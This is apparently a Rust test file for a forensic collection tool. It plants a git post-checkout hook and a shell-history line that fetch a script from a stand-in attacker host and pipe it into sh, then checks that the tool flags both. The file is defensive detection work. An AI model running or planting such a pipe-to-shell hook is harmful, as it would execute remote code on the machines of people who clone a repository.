//! The 2026-07 infection vector: a cloned repo with a live git hook that
//! pipes a remote script into a shell. Persistence state must record the hook, and the
//! shell history line must carry the pipe-to-shell flag.

use std::path::Path;
use std::process::Command;

fn footprint(db: &Path, args: &[&str]) -> String {
    let out = Command::new(env!("CARGO_BIN_EXE_footprint"))
        .arg("--case")
        .arg(db)
        .args(args)
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8(out.stdout).unwrap()
}

#[test]
fn live_git_hook_is_captured_and_the_shell_line_flagged() {
    let dir = tempfile::tempdir().unwrap();
    let home = dir.path().join("home/u");
    let repo = home.join("src/candidate-project");
    let hooks = repo.join(".git/hooks");
    std::fs::create_dir_all(&hooks).unwrap();
    std::fs::write(
        hooks.join("post-checkout"),
        "#!/bin/sh\nwget -qO- https://evil.example/payload.sh | sh\n",
    )
    .unwrap();
    // a .sample hook must be ignored
    std::fs::write(hooks.join("post-commit.sample"), "#!/bin/sh\necho ok\n").unwrap();
    std::fs::write(
        home.join(".bash_history"),
        "git clone https://github.com/fake/candidate-project.git\ncd candidate-project\nwget -qO- https://evil.example/payload.sh | sh\n",
    )
    .unwrap();
    let db = dir.path().join("case.db");
    // a minimal system root keeps the persistence snapshot hermetic; user hooks live in --home
    let root = dir.path().join("root");
    std::fs::create_dir_all(root.join("etc")).unwrap();

    footprint(
        &db,
        &[
            "collect",
            "--sources",
            "persist.snapshot,shell.history",
            "--home",
            home.to_str().unwrap(),
            "--root",
            root.to_str().unwrap(),
        ],
    );

    // the live hook is a persistence state record; the .sample one is not
    let state = footprint(
        &db,
        &["state", "--kind", "persist.git_hook", "--format", "jsonl"],
    );
    let hooks_found: Vec<_> = state.lines().collect();
    assert_eq!(hooks_found.len(), 1, "{state}");
    assert!(hooks_found[0].contains("post-checkout"), "{state}");
    assert!(!hooks_found[0].contains("post-commit"), "{state}");

    // the shell history line that pipes to a shell carries the flag
    let hits = footprint(
        &db,
        &[
            "list",
            "--kind",
            "shell.command",
            "--match",
            "payload.sh",
            "--format",
            "jsonl",
        ],
    );
    let line: serde_json::Value = serde_json::from_str(hits.lines().next().unwrap()).unwrap();
    let shown = footprint(&db, &["show", &line["id"].as_u64().unwrap().to_string()]);
    assert!(shown.contains("pipe-to-shell"), "{shown}");
}
